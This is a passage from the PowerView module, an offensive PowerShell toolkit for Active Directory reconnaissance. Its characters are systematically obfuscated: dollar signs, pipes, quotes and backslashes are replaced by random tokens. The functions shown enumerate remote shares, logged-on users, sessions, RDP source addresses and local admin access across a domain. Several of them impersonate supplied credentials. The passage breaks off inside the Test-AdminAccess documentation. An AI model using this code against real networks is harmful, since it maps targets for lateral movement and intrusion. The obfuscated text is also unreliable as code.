                    RaUMachineSid = RaUMembers wZ5t Where-Object {RaU_.SID -match q4gU.*-500q4gU -or (RaU_.SID -match q4gU.*-501q4gU)} wZ5t Select-Object -Expand SID
                    if (RaUMachineSid) {
                        RaUMachineSid = RaUMachineSid.Substring(0, RaUMachineSid.LastIndexOf(q4gU-q4gU))

                        RaUMembers wZ5t ForEach-Object {
                            if (RaU_.SID -match RaUMachineSid) {
                                RaU_ wZ5t Add-Member Noteproperty q4gUIsDomainq4gU RaUFalse
                            }
                            else {
                                RaU_ wZ5t Add-Member Noteproperty q4gUIsDomainq4gU RaUTrue
                            }
                        }
                    }
                    else {
                        RaUMembers wZ5t ForEach-Object {
                            if (RaU_.SID -notmatch q4gUS-1-5-21q4gU) {
                                RaU_ wZ5t Add-Member Noteproperty q4gUIsDomainq4gU RaUFalse
                            }
                            else {
                                RaU_ wZ5t Add-Member Noteproperty q4gUIsDomainq4gU q4gUUNKNOWNq4gU
                            }
                        }
                    }
                    RaUMembers
                }
                else {
                    Write-Verbose Oj8X[Get-NetLocalGroupMember] Error: RaU(([ComponentModel.Win32Exception] RaUResult).Message)Oj8X
                }
            }
            else {
                # otherwise weq4gUre using the WinNT service provider
                try {
                    RaUGroupProvider = [ADSI]Oj8XWinNT://RaUComputer/RaUGroupName,groupOj8X

                    RaUGroupProvider.psbase.Invoke(q4gUMembersq4gU) wZ5t ForEach-Object {

                        RaUMember = New-Object PSObject
                        RaUMember wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                        RaUMember wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaUGroupName

                        RaULocalUser = ([ADSI]RaU_)
                        RaUAdsPath = RaULocalUser.InvokeGet(q4gUAdsPathq4gU).Replace(q4gUWinNT://q4gU, q4gUq4gU)
                        RaUIsGroup = (RaULocalUser.SchemaClassName -like q4gUgroupq4gU)

                        if(([regex]::Matches(RaUAdsPath, q4gU/q4gU)).count -eq 1) {
                            # DOMAINScKjuser
                            RaUMemberIsDomain = RaUTrue
                            RaUName = RaUAdsPath.Replace(q4gU/q4gU, q4gUScKjq4gU)
                        }
                        else {
                            # DOMAINScKjmachineScKjuser
                            RaUMemberIsDomain = RaUFalse
                            RaUName = RaUAdsPath.Substring(RaUAdsPath.IndexOf(q4gU/q4gU)+1).Replace(q4gU/q4gU, q4gUScKjq4gU)
                        }

                        RaUMember wZ5t Add-Member Noteproperty q4gUAccountNameq4gU RaUName
                        RaUMember wZ5t Add-Member Noteproperty q4gUSIDq4gU ((New-Object System.Security.Principal.SecurityIdentifier(RaULocalUser.InvokeGet(q4gUObjectSIDq4gU),0)).Value)
                        RaUMember wZ5t Add-Member Noteproperty q4gUIsGroupq4gU RaUIsGroup
                        RaUMember wZ5t Add-Member Noteproperty q4gUIsDomainq4gU RaUMemberIsDomain

                        # if (RaUMemberIsDomain) {
                        #     # translate the binary sid to a string
                        #     RaUMember wZ5t Add-Member Noteproperty q4gUSIDq4gU ((New-Object System.Security.Principal.SecurityIdentifier(RaULocalUser.InvokeGet(q4gUObjectSIDq4gU),0)).Value)
                        #     RaUMember wZ5t Add-Member Noteproperty q4gUDescriptionq4gU q4gUq4gU
                        #     RaUMember wZ5t Add-Member Noteproperty q4gUDisabledq4gU q4gUq4gU

                        #     if (RaUIsGroup) {
                        #         RaUMember wZ5t Add-Member Noteproperty q4gULastLoginq4gU q4gUq4gU
                        #     }
                        #     else {
                        #         try {
                        #             RaUMember wZ5t Add-Member Noteproperty q4gULastLoginq4gU RaULocalUser.InvokeGet(q4gULastLoginq4gU)
                        #         }
                        #         catch {
                        #             RaUMember wZ5t Add-Member Noteproperty q4gULastLoginq4gU q4gUq4gU
                        #         }
                        #     }
                        #     RaUMember wZ5t Add-Member Noteproperty q4gUPwdLastSetq4gU q4gUq4gU
                        #     RaUMember wZ5t Add-Member Noteproperty q4gUPwdExpiredq4gU q4gUq4gU
                        #     RaUMember wZ5t Add-Member Noteproperty q4gUUserFlagsq4gU q4gUq4gU
                        # }
                        # else {
                        #     # translate the binary sid to a string
                        #     RaUMember wZ5t Add-Member Noteproperty q4gUSIDq4gU ((New-Object System.Security.Principal.SecurityIdentifier(RaULocalUser.InvokeGet(q4gUObjectSIDq4gU),0)).Value)
                        #     RaUMember wZ5t Add-Member Noteproperty q4gUDescriptionq4gU (RaULocalUser.Description)

                        #     if (RaUIsGroup) {
                        #         RaUMember wZ5t Add-Member Noteproperty q4gUPwdLastSetq4gU q4gUq4gU
                        #         RaUMember wZ5t Add-Member Noteproperty q4gUPwdExpiredq4gU q4gUq4gU
                        #         RaUMember wZ5t Add-Member Noteproperty q4gUUserFlagsq4gU q4gUq4gU
                        #         RaUMember wZ5t Add-Member Noteproperty q4gUDisabledq4gU q4gUq4gU
                        #         RaUMember wZ5t Add-Member Noteproperty q4gULastLoginq4gU q4gUq4gU
                        #     }
                        #     else {
                        #         RaUMember wZ5t Add-Member Noteproperty q4gUPwdLastSetq4gU ( (Get-Date).AddSeconds(-RaULocalUser.PasswordAge[0]))
                        #         RaUMember wZ5t Add-Member Noteproperty q4gUPwdExpiredq4gU ( RaULocalUser.PasswordExpired[0] -eq q4gU1q4gU)
                        #         RaUMember wZ5t Add-Member Noteproperty q4gUUserFlagsq4gU ( RaULocalUser.UserFlags[0] )
                        #         # UAC flags of 0x2 mean the account is disabled
                        #         RaUMember wZ5t Add-Member Noteproperty q4gUDisabledq4gU RaU((RaULocalUser.UserFlags.value -band 2) -eq 2)
                        #         try {
                        #             RaUMember wZ5t Add-Member Noteproperty q4gULastLoginq4gU ( RaULocalUser.LastLogin[0])
                        #         }
                        #         catch {
                        #             RaUMember wZ5t Add-Member Noteproperty q4gULastLoginq4gU q4gUq4gU
                        #         }
                        #     }
                        # }

                        RaUMember
                    }
                }
                catch {
                    Write-Verbose Oj8X[Get-NetLocalGroupMember] Error for RaUComputer : RaU_Oj8X
                }
            }
        }
    }
    
    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-NetShare {
<#
.SYNOPSIS

Returns open shares on the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetShareEnum Win32API call to query
a given host for open shares. This is a replacement for Oj8Xnet share ScKjScKjhostnameOj8X.

.PARAMETER ComputerName

Specifies the hostname to query for shares (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetShare

Returns active shares on the local host.

.EXAMPLE

Get-NetShare -ComputerName sqlserver

Returns active shares on the q4gUsqlserverq4gU host

.EXAMPLE

Get-DomainComputer wZ5t Get-NetShare

Returns all shares for all computers in the domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-NetShare -ComputerName sqlserver -Credential RaUCred

.OUTPUTS

PowerView.ShareInfo

A PSCustomObject representing a SHARE_INFO_1 structure, including
the name/type/remark for each share, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType(q4gUPowerView.ShareInfoq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            # arguments for NetShareEnum
            RaUQueryLevel = 1
            RaUPtrInfo = [IntPtr]::Zero
            RaUEntriesRead = 0
            RaUTotalRead = 0
            RaUResumeHandle = 0

            # get the raw share information
            RaUResult = RaUNetapi32::NetShareEnum(RaUComputer, RaUQueryLevel, [ref]RaUPtrInfo, -1, [ref]RaUEntriesRead, [ref]RaUTotalRead, [ref]RaUResumeHandle)

            # locate the offset of the initial intPtr
            RaUOffset = RaUPtrInfo.ToInt64()

            # 0 = success
            if ((RaUResult -eq 0) -and (RaUOffset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                RaUIncrement = RaUSHARE_INFO_1::GetSize()

                # parse all the result structures
                for (RaUi = 0; (RaUi -lt RaUEntriesRead); RaUi++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    RaUNewIntPtr = New-Object System.Intptr -ArgumentList RaUOffset
                    RaUInfo = RaUNewIntPtr -as RaUSHARE_INFO_1

                    # return all the sections of the structure - have to do it this way for V2
                    RaUShare = RaUInfo wZ5t Select-Object *
                    RaUShare wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                    RaUShare.PSObject.TypeNames.Insert(0, q4gUPowerView.ShareInfoq4gU)
                    RaUOffset = RaUNewIntPtr.ToInt64()
                    RaUOffset += RaUIncrement
                    RaUShare
                }

                # free up the result buffer
                RaUNull = RaUNetapi32::NetApiBufferFree(RaUPtrInfo)
            }
            else {
                Write-Verbose Oj8X[Get-NetShare] Error: RaU(([ComponentModel.Win32Exception] RaUResult).Message)Oj8X
            }
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-NetLoggedon {
<#
.SYNOPSIS

Returns users logged on the local (or a remote) machine.
Note: administrative rights needed for newer Windows OSes.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetWkstaUserEnum Win32API call to query
a given host for actively logged on users.

.PARAMETER ComputerName

Specifies the hostname to query for logged on users (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetLoggedon

Returns users actively logged onto the local host.

.EXAMPLE

Get-NetLoggedon -ComputerName sqlserver

Returns users actively logged onto the q4gUsqlserverq4gU host.

.EXAMPLE

Get-DomainComputer wZ5t Get-NetLoggedon

Returns all logged on users for all computers in the domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-NetLoggedon -ComputerName sqlserver -Credential RaUCred

.OUTPUTS

PowerView.LoggedOnUserInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the UserName/LogonDomain/AuthDomains/LogonServer for each user, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType(q4gUPowerView.LoggedOnUserInfoq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            # declare the reference variables
            RaUQueryLevel = 1
            RaUPtrInfo = [IntPtr]::Zero
            RaUEntriesRead = 0
            RaUTotalRead = 0
            RaUResumeHandle = 0

            # get logged on user information
            RaUResult = RaUNetapi32::NetWkstaUserEnum(RaUComputer, RaUQueryLevel, [ref]RaUPtrInfo, -1, [ref]RaUEntriesRead, [ref]RaUTotalRead, [ref]RaUResumeHandle)

            # locate the offset of the initial intPtr
            RaUOffset = RaUPtrInfo.ToInt64()

            # 0 = success
            if ((RaUResult -eq 0) -and (RaUOffset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                RaUIncrement = RaUWKSTA_USER_INFO_1::GetSize()

                # parse all the result structures
                for (RaUi = 0; (RaUi -lt RaUEntriesRead); RaUi++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    RaUNewIntPtr = New-Object System.Intptr -ArgumentList RaUOffset
                    RaUInfo = RaUNewIntPtr -as RaUWKSTA_USER_INFO_1

                    # return all the sections of the structure - have to do it this way for V2
                    RaULoggedOn = RaUInfo wZ5t Select-Object *
                    RaULoggedOn wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                    RaULoggedOn.PSObject.TypeNames.Insert(0, q4gUPowerView.LoggedOnUserInfoq4gU)
                    RaUOffset = RaUNewIntPtr.ToInt64()
                    RaUOffset += RaUIncrement
                    RaULoggedOn
                }

                # free up the result buffer
                RaUNull = RaUNetapi32::NetApiBufferFree(RaUPtrInfo)
            }
            else {
                Write-Verbose Oj8X[Get-NetLoggedon] Error: RaU(([ComponentModel.Win32Exception] RaUResult).Message)Oj8X
            }
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-NetSession {
<#
.SYNOPSIS

Returns session information for the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetSessionEnum Win32API call to query
a given host for active sessions.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetSession

Returns active sessions on the local host.

.EXAMPLE

Get-NetSession -ComputerName sqlserver

Returns active sessions on the q4gUsqlserverq4gU host.

.EXAMPLE

Get-DomainController wZ5t Get-NetSession

Returns active sessions on all domain controllers.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-NetSession -ComputerName sqlserver -Credential RaUCred

.OUTPUTS

PowerView.SessionInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the CName/UserName/Time/IdleTime for each session, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType(q4gUPowerView.SessionInfoq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            # arguments for NetSessionEnum
            RaUQueryLevel = 10
            RaUPtrInfo = [IntPtr]::Zero
            RaUEntriesRead = 0
            RaUTotalRead = 0
            RaUResumeHandle = 0

            # get session information
            RaUResult = RaUNetapi32::NetSessionEnum(RaUComputer, q4gUq4gU, RaUUserName, RaUQueryLevel, [ref]RaUPtrInfo, -1, [ref]RaUEntriesRead, [ref]RaUTotalRead, [ref]RaUResumeHandle)

            # locate the offset of the initial intPtr
            RaUOffset = RaUPtrInfo.ToInt64()

            # 0 = success
            if ((RaUResult -eq 0) -and (RaUOffset -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                RaUIncrement = RaUSESSION_INFO_10::GetSize()

                # parse all the result structures
                for (RaUi = 0; (RaUi -lt RaUEntriesRead); RaUi++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    RaUNewIntPtr = New-Object System.Intptr -ArgumentList RaUOffset
                    RaUInfo = RaUNewIntPtr -as RaUSESSION_INFO_10

                    # return all the sections of the structure - have to do it this way for V2
                    RaUSession = RaUInfo wZ5t Select-Object *
                    RaUSession wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                    RaUSession.PSObject.TypeNames.Insert(0, q4gUPowerView.SessionInfoq4gU)
                    RaUOffset = RaUNewIntPtr.ToInt64()
                    RaUOffset += RaUIncrement
                    RaUSession
                }

                # free up the result buffer
                RaUNull = RaUNetapi32::NetApiBufferFree(RaUPtrInfo)
            }
            else {
                Write-Verbose Oj8X[Get-NetSession] Error: RaU(([ComponentModel.Win32Exception] RaUResult).Message)Oj8X
            }
        }
    }


    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-RegLoggedOn {
<#
.SYNOPSIS

Returns who is logged onto the local (or a remote) machine
through enumeration of remote registry keys.

Note: This function requires only domain user rights on the
machine youq4gUre enumerating, but remote registry must be enabled.

Author: Matt Kelly (@BreakersAll)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, ConvertFrom-SID  

.DESCRIPTION

This function will query the HKU registry values to retrieve the local
logged on users SID and then attempt and reverse it.
Adapted technique from Sysinternalq4gUs PSLoggedOn script. Benefit over
using the NetWkstaUserEnum API (Get-NetLoggedon) of less user privileges
required (NetWkstaUserEnum requires remote admin access).

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-RegLoggedOn

Returns users actively logged onto the local host.

.EXAMPLE

Get-RegLoggedOn -ComputerName sqlserver

Returns users actively logged onto the q4gUsqlserverq4gU host.

.EXAMPLE

Get-DomainController wZ5t Get-RegLoggedOn

Returns users actively logged on all domain controllers.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-RegLoggedOn -ComputerName sqlserver -Credential RaUCred

.OUTPUTS

PowerView.RegLoggedOnUser

A PSCustomObject including the UserDomain/UserName/UserSID of each
actively logged on user, with the ComputerName added.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.RegLoggedOnUserq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            try {
                # retrieve HKU remote registry values
                RaUReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(q4gUUsersq4gU, Oj8XRaUComputerNameOj8X)

                # sort out bogus sidq4gUs like _class
                RaUReg.GetSubKeyNames() wZ5t Where-Object { RaU_ -match q4gUS-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+RaUq4gU } wZ5t ForEach-Object {
                    RaUUserName = ConvertFrom-SID -ObjectSID RaU_ -OutputType q4gUDomainSimpleq4gU

                    if (RaUUserName) {
                        RaUUserName, RaUUserDomain = RaUUserName.Split(q4gU@q4gU)
                    }
                    else {
                        RaUUserName = RaU_
                        RaUUserDomain = RaUNull
                    }

                    RaURegLoggedOnUser = New-Object PSObject
                    RaURegLoggedOnUser wZ5t Add-Member Noteproperty q4gUComputerNameq4gU Oj8XRaUComputerNameOj8X
                    RaURegLoggedOnUser wZ5t Add-Member Noteproperty q4gUUserDomainq4gU RaUUserDomain
                    RaURegLoggedOnUser wZ5t Add-Member Noteproperty q4gUUserNameq4gU RaUUserName
                    RaURegLoggedOnUser wZ5t Add-Member Noteproperty q4gUUserSIDq4gU RaU_
                    RaURegLoggedOnUser.PSObject.TypeNames.Insert(0, q4gUPowerView.RegLoggedOnUserq4gU)
                    RaURegLoggedOnUser
                }
            }
            catch {
                Write-Verbose Oj8X[Get-RegLoggedOn] Error opening remote registry on q4gURaUComputerNameq4gU : RaU_Oj8X
            }
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-NetRDPSession {
<#
.SYNOPSIS

Returns remote desktop/session information for the local (or a remote) machine.

Note: only members of the Administrators or Account Operators local group
can successfully execute this functionality on a remote target.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the WTSEnumerateSessionsEx and WTSQuerySessionInformation
Win32API calls to query a given RDP remote service for active sessions and originating
IPs. This is a replacement for qwinsta.

.PARAMETER ComputerName

Specifies the hostname to query for active sessions (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetRDPSession

Returns active RDP/terminal sessions on the local host.

.EXAMPLE

Get-NetRDPSession -ComputerName Oj8XsqlserverOj8X

Returns active RDP/terminal sessions on the q4gUsqlserverq4gU host.

.EXAMPLE

Get-DomainController wZ5t Get-NetRDPSession

Returns active RDP/terminal sessions on all domain controllers.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-NetRDPSession -ComputerName sqlserver -Credential RaUCred

.OUTPUTS

PowerView.RDPSessionInfo

A PSCustomObject representing a combined WTS_SESSION_INFO_1 and WTS_CLIENT_ADDRESS structure,
with the ComputerName added.

.LINK

https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
#>

    [OutputType(q4gUPowerView.RDPSessionInfoq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {

            # open up a handle to the Remote Desktop Session host
            RaUHandle = RaUWtsapi32::WTSOpenServerEx(RaUComputer)

            # if we get a non-zero handle back, everything was successful
            if (RaUHandle -ne 0) {

                # arguments for WTSEnumerateSessionsEx
                RaUppSessionInfo = [IntPtr]::Zero
                RaUpCount = 0

                # get information on all current sessions
                RaUResult = RaUWtsapi32::WTSEnumerateSessionsEx(RaUHandle, [ref]1, 0, [ref]RaUppSessionInfo, [ref]RaUpCount);RaULastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # locate the offset of the initial intPtr
                RaUOffset = RaUppSessionInfo.ToInt64()

                if ((RaUResult -ne 0) -and (RaUOffset -gt 0)) {

                    # work out how much to increment the pointer by finding out the size of the structure
                    RaUIncrement = RaUWTS_SESSION_INFO_1::GetSize()

                    # parse all the result structures
                    for (RaUi = 0; (RaUi -lt RaUpCount); RaUi++) {

                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        RaUNewIntPtr = New-Object System.Intptr -ArgumentList RaUOffset
                        RaUInfo = RaUNewIntPtr -as RaUWTS_SESSION_INFO_1

                        RaURDPSession = New-Object PSObject

                        if (RaUInfo.pHostName) {
                            RaURDPSession wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUInfo.pHostName
                        }
                        else {
                            # if no hostname returned, use the specified hostname
                            RaURDPSession wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                        }

                        RaURDPSession wZ5t Add-Member Noteproperty q4gUSessionNameq4gU RaUInfo.pSessionName

                        if (RaU(-not RaUInfo.pDomainName) -or (RaUInfo.pDomainName -eq q4gUq4gU)) {
                            # if a domain isnq4gUt returned just use the username
                            RaURDPSession wZ5t Add-Member Noteproperty q4gUUserNameq4gU Oj8XRaU(RaUInfo.pUserName)Oj8X
                        }
                        else {
                            RaURDPSession wZ5t Add-Member Noteproperty q4gUUserNameq4gU Oj8XRaU(RaUInfo.pDomainName)ScKjRaU(RaUInfo.pUserName)Oj8X
                        }

                        RaURDPSession wZ5t Add-Member Noteproperty q4gUIDq4gU RaUInfo.SessionID
                        RaURDPSession wZ5t Add-Member Noteproperty q4gUStateq4gU RaUInfo.State

                        RaUppBuffer = [IntPtr]::Zero
                        RaUpBytesReturned = 0

                        # query for the source client IP with WTSQuerySessionInformation
                        #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                        RaUResult2 = RaUWtsapi32::WTSQuerySessionInformation(RaUHandle, RaUInfo.SessionID, 14, [ref]RaUppBuffer, [ref]RaUpBytesReturned);RaULastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if (RaUResult2 -eq 0) {
                            Write-Verbose Oj8X[Get-NetRDPSession] Error: RaU(([ComponentModel.Win32Exception] RaULastError2).Message)Oj8X
                        }
                        else {
                            RaUOffset2 = RaUppBuffer.ToInt64()
                            RaUNewIntPtr2 = New-Object System.Intptr -ArgumentList RaUOffset2
                            RaUInfo2 = RaUNewIntPtr2 -as RaUWTS_CLIENT_ADDRESS

                            RaUSourceIP = RaUInfo2.Address
                            if (RaUSourceIP[2] -ne 0) {
                                RaUSourceIP = [String]RaUSourceIP[2]+q4gU.q4gU+[String]RaUSourceIP[3]+q4gU.q4gU+[String]RaUSourceIP[4]+q4gU.q4gU+[String]RaUSourceIP[5]
                            }
                            else {
                                RaUSourceIP = RaUNull
                            }

                            RaURDPSession wZ5t Add-Member Noteproperty q4gUSourceIPq4gU RaUSourceIP
                            RaURDPSession.PSObject.TypeNames.Insert(0, q4gUPowerView.RDPSessionInfoq4gU)
                            RaURDPSession

                            # free up the memory buffer
                            RaUNull = RaUWtsapi32::WTSFreeMemory(RaUppBuffer)

                            RaUOffset += RaUIncrement
                        }
                    }
                    # free up the memory result buffer
                    RaUNull = RaUWtsapi32::WTSFreeMemoryEx(2, RaUppSessionInfo, RaUpCount)
                }
                else {
                    Write-Verbose Oj8X[Get-NetRDPSession] Error: RaU(([ComponentModel.Win32Exception] RaULastError).Message)Oj8X
                }
                # close off the service handle
                RaUNull = RaUWtsapi32::WTSCloseServer(RaUHandle)
            }
            else {
                Write-Verbose Oj8X[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: RaUComputerNameOj8X
            }
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Test-AdminAccess {
<#
.SYNOPSIS

Tests if the current user has administrative access to the local (or a remote) machine.

Idea stolen from the local_admin_search_enum post module in Metasploit written by:  
    q4gUBrandon McCann Oj8XzeknoxOj8X <bmccann[at]accuvant.com>q4gU  
    q4gUThomas McCarthy Oj8XsmilingraccoonOj8X <smilingraccoon[at]gmail.com>q4gU  
    q4gURoyce Davis Oj8Xr3dyOj8X <rdavis[at]accuvant.com>q4gU  

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the OpenSCManagerW Win32API call to establish
a handle to the remote host. If this succeeds, the current user context
has local administrator acess to the target.

.PARAMETER ComputerName

Specifies the hostname to check for local admin access (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Test-AdminAccess -ComputerName sqlserver

Returns results indicating whether the current user has admin access to the q4gUsqlserverq4gU host.

.EXAMPLE

Get-DomainComputer wZ5t Test-AdminAccess

Returns what machines in the domain the current user has access to.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Test-AdminAccess -ComputerName sqlserver -Credential RaUCred

.OUTPUTS

PowerView.AdminAccess

A PSCustomObject containing the ComputerName and q4gUIsAdminq4gU set to whether
